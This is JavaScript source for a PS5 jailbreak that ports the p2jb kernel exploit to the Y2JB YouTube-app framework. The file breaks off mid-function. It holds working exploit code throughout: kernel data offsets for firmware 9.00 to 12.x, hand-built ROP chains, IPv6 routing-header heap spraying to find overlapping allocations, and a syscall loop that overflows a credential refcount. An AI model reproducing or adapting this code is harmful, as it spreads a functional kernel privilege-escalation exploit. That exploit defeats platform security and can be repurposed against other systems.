/*
 * p2jb-y2jb - PS5 jailbreak port to Y2JB (YouTube/JS), tested on FW 11.60,
 *            offsets bundled for FW 9.00 - 12.40.
 * MIT License - see LICENSE.
 *
 * Credits:
 *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
 *     (https://github.com/Gezine/Luac0re)
 *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
 *   - elfldr_1320 ELF loader binary: Gezine
 *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
 *
 * Usage: see README.md.
 */

(async function () {
    try {
        const p2jb_version = "P2JB 1.0 (Y2JB port v2)";

        const PAGE_SIZE = 0x4000;

        const AF_UNIX = 1n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_RTHDR = 51n;

        const SOL_SOCKET = 0xffffn;
        const SO_SNDBUF = 0x1001n;

        const UMTX_OP_WAKE = 3n;

        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;

        const F_SETFL = 4n;
        const O_NONBLOCK = 4n;

        const SYSTEM_AUTHID = 0x4800000000010003n;

        const UCRED_SIZE = 360;
        const RTHDR_TAG = 0x13370000;
        const MSG_IOV_NUM = 23;
        const IOV_THREAD_NUM = 4;
        const UIO_THREAD_NUM = 4;
        const UIO_IOV_COUNT = 20n;

        const LAUNCH_ELF_LOADER = true;

        const ENABLE_DEBUG_MENU = true;
        const UIO_SYSSPACE = 1n;

        const TRIPLEFREE_ATTEMPTS = 96;
        const MAX_ROUNDS_TWIN = 10;
        const MAX_ROUNDS_TRIPLET = 500;
        const FIND_TRIPLET_FAST = 5000;
        const FREE_FDS_NUM = 1024;

        const NUM_IPV6_SOCKETS = 64;
        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 256;

        const SYSCALL_EXTRA = {
            recvmsg: 0x1bn,
            socketpair: 0x87n,
            kqueue: 0x16an,
            kqueueex: 0x8Dn,
            readv: 0x78n,
            writev: 0x79n,
            cpuset_setaffinity: 0x1e8n,
            cpuset_getaffinity: 0x1e7n,
            rtprio_thread: 0x1d2n,
            thr_new: 0x1c7n,
            thr_exit: 0x1afn,
            thr_kill: 0x1b1n,
            umtx_op: 0x1c6n,
            sched_yield: 0x14bn,
            setuid: 0x17n,
            setrlimit: 0xC3n,
        };
        for (const k in SYSCALL_EXTRA) {
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
        }

        const FW_OFFSETS_P2JB = {
            "9.00": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D72064n,
                DATA_BASE_ROOTVNODE: 0x02FDB510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n,
            },
            "9.05": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D73064n,
                DATA_BASE_ROOTVNODE: 0x02FDB510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n,
            },
            "10.00": {
                DATA_BASE_ALLPROC: 0x02765D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D79064n,
                DATA_BASE_ROOTVNODE: 0x02FA3510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02CF0EF8n,
                DATA_BASE_GVMSPACE: 0x02D52570n,
            },
            "11.00": {
                DATA_BASE_ALLPROC: 0x02875D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D8C064n,
                DATA_BASE_ROOTVNODE: 0x030B7510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E04F18n,
                DATA_BASE_GVMSPACE: 0x02E66570n,
            },
            "12.00": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_ROOTVNODE: 0x030D7510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n,
            },
        };
        const FW_ALIAS_P2JB = {
            "9.00": "9.00",
            "9.03": "9.05", "9.04": "9.05", "9.20": "9.05", "9.40": "9.05", "9.51": "9.05", "9.60": "9.05",
            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.50": "10.00", "10.60": "10.00", "10.70": "10.00",
            "11.00": "11.00", "11.02": "11.00", "11.20": "11.00", "11.40": "11.00",
            "11.50": "11.00", "11.60": "11.00", "11.61": "11.00",
            "12.00": "12.00", "12.02": "12.00", "12.20": "12.00", "12.40": "12.00",
            "12.50": "12.00", "12.60": "12.00", "12.70": "12.00",
        };

        function ensure_kernel_offset() {
            try {
                if (typeof kernel_offset === "object" && kernel_offset !== null
                    && kernel_offset.DATA_BASE_ALLPROC !== undefined) return;
                kernel_offset = get_kernel_offset();
                return;
            } catch (_) { }

            let key = FW_VERSION;
            if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
            let fw = FW_OFFSETS_P2JB[key];
            if (!fw) {
                const major = FW_VERSION.split(".")[0];
                fw = FW_OFFSETS_P2JB[major + ".00"];
            }
            if (!fw) throw new Error("p2jb: FW " + FW_VERSION + " not supported");

            kernel_offset = {
                DATA_BASE: null, DATA_SIZE: null,
                DATA_BASE_DYNAMIC: 0x10000n, DATA_BASE_TO_DYNAMIC: null,
                DATA_BASE_ALLPROC: fw.DATA_BASE_ALLPROC,
                DATA_BASE_SECURITY_FLAGS: fw.DATA_BASE_SECURITY_FLAGS,
                DATA_BASE_ROOTVNODE: fw.DATA_BASE_ROOTVNODE,
                DATA_BASE_KERNEL_PMAP_STORE: fw.DATA_BASE_KERNEL_PMAP_STORE,
                DATA_BASE_GVMSPACE: fw.DATA_BASE_GVMSPACE,
                DATA_BASE_TARGET_ID: fw.DATA_BASE_SECURITY_FLAGS + 0x09n,
                DATA_BASE_QA_FLAGS: fw.DATA_BASE_SECURITY_FLAGS + 0x24n,
                DATA_BASE_UTOKEN_FLAGS: fw.DATA_BASE_SECURITY_FLAGS + 0x8Cn,

                PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n, PROC_VM_SPACE: 0x200n,
                PROC_COMM: -1n, PROC_SYSENT: -1n,

                UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n, UCRED_CR_PRISON: 0x30n,
                UCRED_CR_SCEAUTHID: 0x58n, UCRED_CR_SCECAPS0: 0x60n,
                UCRED_CR_SCECAPS1: 0x68n, UCRED_CR_SCEATTRS: 0x83n,

                FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n, SIZEOF_OFILES: 0x30n,

                FD_RDIR: 0x10n, FD_JDIR: 0x18n, KQ_FDP: 0xA8n, KL_LOCK: 0x68n,

                INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n, SO_PCB: 0x18n,

                PIPE_SIGIO: 0xD8n,

                PMAP_CR3: 0x28n, PMAP_PML4: 0x20n,
            };
        }

        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        let failcheck_path = null;

        function my_init_threading() {
            const setjmp_addr = libc_base + 0x58F80n;
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            saved_fpu_ctrl = Number(read32(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32(jmpbuf + 0x44n));
        }

        function js_sleep(ms) {
            return new Promise((resolve) => { setTimeout(resolve, ms); });
        }

        function spawn_leak_worker(chain_addr) {
            const Thrd_create_addr = libc_base + 0x4BF0n;
            const longjmp_addr = libc_base + 0x58FD0n;
            const scratch = malloc(0x100);
            for (let i = 0; i < 0x100; i += 8) write64(scratch + BigInt(i), 0n);
            const jb = malloc(0x60);
            for (let i = 0; i < 0x60; i += 8) write64(jb + BigInt(i), scratch);
            write64(jb + 0x00n, ROP.ret);
            write64(jb + 0x10n, chain_addr);
            write32(jb + 0x40n, BigInt(saved_fpu_ctrl));
            write32(jb + 0x44n, BigInt(saved_mxcsr));
            const thr_handle = malloc(8); write64(thr_handle, 0n);
            const ret = call(Thrd_create_addr, thr_handle, longjmp_addr, jb);
            if (ret !== 0n) fail("leak worker Thrd_create failed: " + toHex(ret));
            return read64(thr_handle);
        }

        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
            const entry = buf + 0x4000n;

            const mask = malloc(0x10);
            write64(mask + 0x0n, 1n << BigInt(core));
            write64(mask + 0x8n, 0n);

            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(mask);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const readBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.read);
            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
            emit(ROP.pop_rsi); emit(dummybuf);
            emit(ROP.pop_rdx); emit(1n);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const kqBase = [];
            for (let k = 0; k < unroll; k++) {
                kqBase.push(idx);
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(readBase + 0, ROP.pop_rax);
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, ROP.pop_rdi);
            repairSlot(readBase + 3, BigInt(pipe_rfd));
            repairSlot(readBase + 4, ROP.pop_rsi);
            repairSlot(readBase + 5, dummybuf);
            repairSlot(readBase + 6, ROP.pop_rdx);
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            for (let k = 0; k < unroll; k++) {
                const b = kqBase[k];
                repairSlot(b + 0, ROP.pop_rax);
                repairSlot(b + 1, SYSCALL.kqueueex);
                repairSlot(b + 2, ROP.pop_rdi);
                repairSlot(b + 3, POC_ARG);
                repairSlot(b + 4, syscall_wrapper);
            }

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const PIVOT = idx; emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT = idx;
            for (let k = 0; k < remainder; k++) {
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }
            emit(ROP.pop_rax); emit(EXIT_MARK);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
        }

        function ulog(msg) {
            return log("[p2jb] " + msg);
        }
        function fail(msg) { throw new Error("p2jb: " + msg); }

        function nanosleep_ms(ms) {
            const ts = malloc(16);
            write64(ts, BigInt(Math.floor(ms / 1000)));
            write64(ts + 8n, BigInt((ms % 1000) * 1000000));
            syscall(SYSCALL.nanosleep, ts, 0n);
        }
        function sched_yield_n(n) {
            for (let i = 0; i < n; i++) syscall(SYSCALL.sched_yield);
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8(buf, 0n);
            write8(buf + 1n, BigInt(len));
            write8(buf + 2n, 0n);
            write8(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }
        function set_rthdr(sd, buf, len) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                buf, BigInt(len));
        }
        function free_rthdr(sd) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        function make_worker_sync(n) {

            const raw = malloc(8 + n * 8 + 128);
            const align = (64n - (raw % 64n)) % 64n;
            const finished_base = raw + align;
            for (let i = 0; i < n; i++) write64(finished_base + BigInt(i * 8), 0n);

            const pipe_r = new Array(n);
            const pipe_w = new Array(n);
            for (let i = 0; i < n; i++) {
                const [r, w] = create_pipe();
                pipe_r[i] = Number(r);
                pipe_w[i] = Number(w);
            }

            const wake_buf = malloc(1);
            write8(wake_buf, 0x41n);

            return {
                n,
                finished: finished_base,
                pipe_r,
                pipe_w,
                signal() {

                    for (let i = 0; i < n; i++) write64(finished_base + BigInt(i * 8), 0n);
                    for (let i = 0; i < n; i++) {
                        syscall(SYSCALL.write, BigInt(pipe_w[i]), wake_buf, 1n);
                    }
                },
                wait(timeout_ms) {

                    const deadline = Date.now() + (timeout_ms || 15000);
                    while (true) {
                        let done = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64(finished_base + BigInt(i * 8)) === 0n) {
                                done = false; stuck = i; break;
                            }
                        }
                        if (done) return;
                        if (Date.now() > deadline)
                            fail("worker_sync.wait: timeout - worker " + stuck +
                                "/" + n + " stalled (no response in 15s)");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                close_pipes() {
                    for (let i = 0; i < n; i++) {
                        syscall(SYSCALL.close, BigInt(pipe_r[i]));
                        syscall(SYSCALL.close, BigInt(pipe_w[i]));
                    }
                },
            };
        }

        function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
            const STACK_SIZE = 0x10000;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
            const entry = buf + 0x4000n;

            const dummy_buf = malloc(8);
            const pipe_rfd = ws.pipe_r[wid];
            const finished_addr = ws.finished + BigInt(wid * 8);
            const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;

            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(cpu_mask_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(1n);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_params_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const readBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.read);
            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
            emit(ROP.pop_rsi); emit(dummy_buf);
            emit(ROP.pop_rdx); emit(1n);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const workBase = idx;
            emit(ROP.pop_rax); emit(sysnum);
            emit(ROP.pop_rdi); emit(BigInt(fd));
            emit(ROP.pop_rsi); emit(iov_ptr);
            emit(ROP.pop_rdx); emit(count_arg);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(readBase + 0, ROP.pop_rax);
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, ROP.pop_rdi);
            repairSlot(readBase + 3, BigInt(pipe_rfd));
            repairSlot(readBase + 4, ROP.pop_rsi);
            repairSlot(readBase + 5, dummy_buf);
            repairSlot(readBase + 6, ROP.pop_rdx);
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            repairSlot(workBase + 0, ROP.pop_rax);
            repairSlot(workBase + 1, sysnum);
            repairSlot(workBase + 2, ROP.pop_rdi);
            repairSlot(workBase + 3, BigInt(fd));
            repairSlot(workBase + 4, ROP.pop_rsi);
            repairSlot(workBase + 5, iov_ptr);
            repairSlot(workBase + 6, ROP.pop_rdx);
            repairSlot(workBase + 7, count_arg);
            repairSlot(workBase + 8, syscall_wrapper);

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const PIVOT = idx; emit(at(LOOP_START));

            const EXIT = idx;
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
        }

        function make_state() {
            return {
                triplets: [-1, -1, -1],
                free_fds: [],
                free_fd_idx: 0,
                active_uio_mode: 0,
                OFF: kernel_offset,
            };
        }

        function setup_cpu_masks(S) {
            S.cpu_mask = malloc(16);
            for (let i = 0; i < 16; i++) write8(S.cpu_mask + BigInt(i), 0n);
            write16(S.cpu_mask, BigInt(1 << MAIN_CORE));

            S.rt_params = malloc(4);
            write16(S.rt_params, PRI_REALTIME);
            write16(S.rt_params + 2n, BigInt(MAIN_RTPRIO));
        }

        function apply_main_thread_pinning(S) {
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
        }

        function setup_worker_sockets(S) {
            const sv1 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv1);
            S.iov_sock_a = Number(read32(sv1));
            S.iov_sock_b = Number(read32(sv1 + 4n));

            const sv2 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv2);
            S.uio_sock_a = Number(read32(sv2));
            S.uio_sock_b = Number(read32(sv2 + 4n));
        }

        function setup_iov_buffers(S) {
            S.recvmsg_iovecs = malloc(MSG_IOV_NUM * 16);
            for (let i = 0; i < MSG_IOV_NUM * 16; i += 8) {
                write64(S.recvmsg_iovecs + BigInt(i), 0n);
            }

            write64(S.recvmsg_iovecs, 1n);
            write64(S.recvmsg_iovecs + 8n, 1n);

            S.recvmsg_hdr = malloc(0x38);
            for (let i = 0; i < 0x38; i += 8) write64(S.recvmsg_hdr + BigInt(i), 0n);
            write64(S.recvmsg_hdr + 0x10n, S.recvmsg_iovecs);
            write32(S.recvmsg_hdr + 0x18n, BigInt(MSG_IOV_NUM));
        }

        function setup_uio_buffers(S) {
            S.uio_read_buf = malloc(64);
            for (let i = 0; i < 64; i += 8) {
                write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            }
            S.uio_write_buf = malloc(64);

            S.uio_iov_read = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64(S.uio_iov_read + BigInt(i), 0n);
            }
            write64(S.uio_iov_read, S.uio_read_buf);
            write64(S.uio_iov_read + 8n, 8n);

            S.uio_iov_write = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64(S.uio_iov_write + BigInt(i), 0n);
            }
            write64(S.uio_iov_write, S.uio_write_buf);
            write64(S.uio_iov_write + 8n, 8n);

            S.kread_result_bufs = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) S.kread_result_bufs.push(malloc(64));

            S.kread_sndbuf = malloc(4);
            S.kwrite_sndbuf = malloc(4);

            S.scratch = malloc(16);
            S.scratch_big = malloc(0x4000);
            for (let i = 0; i < 0x4000; i += 8) write64(S.scratch_big + BigInt(i), 0n);
            S.dummy_byte = malloc(8);
            S.len_out = malloc(4);
            S.rthdr_readback = malloc(360);
            for (let i = 0; i < 360; i += 8) write64(S.rthdr_readback + BigInt(i), 0n);
        }

        function setup_pipes_kernrw(S) {
            const [m_r, m_w] = create_pipe();
            const [v_r, v_w] = create_pipe();
            S.master_rfd = Number(m_r); S.master_wfd = Number(m_w);
            S.victim_rfd = Number(v_r); S.victim_wfd = Number(v_w);
            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                syscall(SYSCALL.fcntl, BigInt(fd), F_SETFL, O_NONBLOCK);
            }
        }

        function setup_workers(S) {
            S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
            S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
            S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM);

            S.iov_workers = [];
            for (let i = 0; i < IOV_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
                    S.cpu_mask, S.rt_params,
                );
                ch.tid = spawn_leak_worker(ch.entry);
                S.iov_workers.push(ch);
            }
            S.uio_read_workers = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
                    S.cpu_mask, S.rt_params,
                );
                ch.tid = spawn_leak_worker(ch.entry);
                S.uio_read_workers.push(ch);
            }
            S.uio_write_workers = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
                    S.cpu_mask, S.rt_params,
                );
                ch.tid = spawn_leak_worker(ch.entry);
                S.uio_write_workers.push(ch);
            }
        }

        function setup_ipv6_spray(S) {
            S.ipv6_sockets = [];
            for (let i = 0; i < NUM_IPV6_SOCKETS; i++) {
                const fd = syscall(SYSCALL.socket, AF_INET6, SOCK_STREAM, 0n);
                if (fd === 0xffffffffffffffffn) break;
                S.ipv6_sockets.push(Number(fd));
            }
            S.ipv6_count = S.ipv6_sockets.length;
            for (const fd of S.ipv6_sockets) free_rthdr(fd);
            nanosleep_ms(500);

            S.rthdr_spray = malloc(UCRED_SIZE);
            for (let i = 0; i < UCRED_SIZE; i += 8) write64(S.rthdr_spray + BigInt(i), 0n);
            S.rthdr_spray_len = build_rthdr(S.rthdr_spray, UCRED_SIZE);

            S.tag_buf = malloc(16);
            S.tag_len = malloc(4);
        }

        function rthdr_set(S, idx) {
            return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
        }
        function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }
        function rthdr_get_tag(S, idx) {
            write32(S.tag_len, 8n);
            const r = syscall(SYSCALL.getsockopt,
                BigInt(S.ipv6_sockets[idx]),
                IPPROTO_IPV6, IPV6_RTHDR, S.tag_buf, S.tag_len);
            if (r === 0xffffffffffffffffn) return null;
            return Number(read32(S.tag_buf + 4n));
        }

        async function find_twins(S, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    write32(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                    rthdr_set(S, i);
                }
                for (let i = 0; i < S.ipv6_count; i++) {
                    const v = rthdr_get_tag(S, i);
                    if (v === null) continue;
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG && i !== j && j < S.ipv6_count) {
                        return [i, j];
                    }
                }
                if (round_ % 50 === 0) syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function find_triplet(S, master_idx, exclude_idx, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    if (i !== master_idx && i !== exclude_idx) {
                        write32(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                        rthdr_set(S, i);
                    }
                }
                const v = rthdr_get_tag(S, master_idx);
                if (v !== null) {
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG &&
                        j !== master_idx && j !== exclude_idx && j < S.ipv6_count) return j;
                }
                if (round_ % 100 === 0) syscall(SYSCALL.sched_yield);
            }
            return -1;
        }

        function triplets_valid(S) {
            return S.triplets[0] >= 0 && S.triplets[1] >= 0 && S.triplets[2] >= 0
                && S.triplets[1] < S.ipv6_count && S.triplets[2] < S.ipv6_count;
        }

        function repair_triplets(S) {
            if (S.triplets[1] < 0 || S.triplets[1] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                    if (S.triplets[1] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            if (S.triplets[2] < 0 || S.triplets[2] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                    if (S.triplets[2] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            return triplets_valid(S);
        }

        async function prepare_fds(S) {

            const rl = malloc(16);
            syscall(0xC2n, 8n, rl);
            const nofile_hard = read64(rl + 8n);
            write64(rl, nofile_hard);
            write64(rl + 8n, nofile_hard);
            syscall(SYSCALL.setrlimit, 8n, rl);

            const cand = ["/dev/", "/", "/app0/", "/dev/urandom",
                "/dev/notification0", "/dev/gc"];
            let held_path = 0n;
            for (let c = 0; c < cand.length; c++) {
                const sp = alloc_string(cand[c]);
                const a = syscall(SYSCALL.open, sp, 0n);
                if (a === 0xffffffffffffffffn) continue;
                const b = syscall(SYSCALL.open, sp, 0n);
                syscall(SYSCALL.close, a);
                if (b === 0xffffffffffffffffn) continue;
                syscall(SYSCALL.close, b);
                held_path = sp;
                break;
            }
            const new_free_fd = () => held_path !== 0n
                ? syscall(SYSCALL.open, held_path, 0n)
                : syscall(SYSCALL.socket, 28n, 2n, 0n);

            const probe_fds = [];
            for (let i = 0; i < 8192; i++) {
                const pfd = new_free_fd();
                if (pfd === 0xffffffffffffffffn) break;
                probe_fds.push(pfd);
            }
            const fd_budget = probe_fds.length;
            for (let i = 0; i < probe_fds.length; i++)
                syscall(SYSCALL.close, BigInt(probe_fds[i]));

            let free_fds_num = fd_budget - 96;
            if (free_fds_num > 2048) free_fds_num = 2048;

            const R_ESTIMATE = 69 + 12 + 1 + 1;
            const BURST_MIN = R_ESTIMATE + 40;
            if (free_fds_num < BURST_MIN)
                fail("fd budget too small: free_fds_num=" + free_fds_num +
                    " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                    BURST_MIN + "); fd_budget=" + fd_budget);

            syscall(SYSCALL.setuid, 1n);

            await js_sleep(10000);

            const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);

            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const LEAK_UNROLL = 4096;
            const U = BigInt(LEAK_UNROLL);
            const BPLUS1 = TOTAL_SYSCALLS / U;
            const NORMAL_BATCHES = BPLUS1 - 1n;
            const WORKER_CALLS = BPLUS1 * U;
            const REMAINDER = TOTAL_SYSCALLS - WORKER_CALLS;

            my_init_threading();
            const [lk_r, lk_w] = create_pipe();
            const lk_rfd = Number(lk_r), lk_wfd = Number(lk_w);

            syscall(SYSCALL.fcntl, BigInt(lk_wfd), F_SETFL, O_NONBLOCK);

            const finished = malloc(8); write64(finished, 0n);
            const dummybuf = malloc(8);
            const FEED_CHUNK = 4096;
            const chunkbuf = malloc(FEED_CHUNK);
            const lw = build_leak_worker_chain(2, lk_rfd, finished, dummybuf,
                LEAK_UNROLL, Number(REMAINDER));
            spawn_leak_worker(lw.entry);

            let queued = 0n;
            while (queued < NORMAL_BATCHES) {
                let want = NORMAL_BATCHES - queued;
                if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
                const n = syscall(SYSCALL.write, BigInt(lk_wfd), chunkbuf, want);
                if (n > 0n && n <= BigInt(FEED_CHUNK)) queued += n;
                await js_sleep(500);
            }

            while (true) {
                write64(finished, 0n);
                await js_sleep(1500);
                if (read64(finished) === 0n) break;
            }

            write64(lw.pivotAddr, lw.exitAddr);
            write64(finished, 0n);
            syscall(SYSCALL.write, BigInt(lk_wfd), chunkbuf, 1n);
            {
                const dl = Date.now() + 15000;
                while (read64(finished) !== EXIT_MARK && Date.now() < dl)
                    await js_sleep(50);
            }
            syscall(SYSCALL.close, BigInt(lk_rfd));
            syscall(SYSCALL.close, BigInt(lk_wfd));

            for (let i = 0; i < free_fds_num; i++) {
                const fd = new_free_fd();
                if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                S.free_fds.push(Number(fd));
            }
            syscall(SYSCALL.setuid, 1n);

            await js_sleep(10000);
        }

        function free_one_fd(S) {

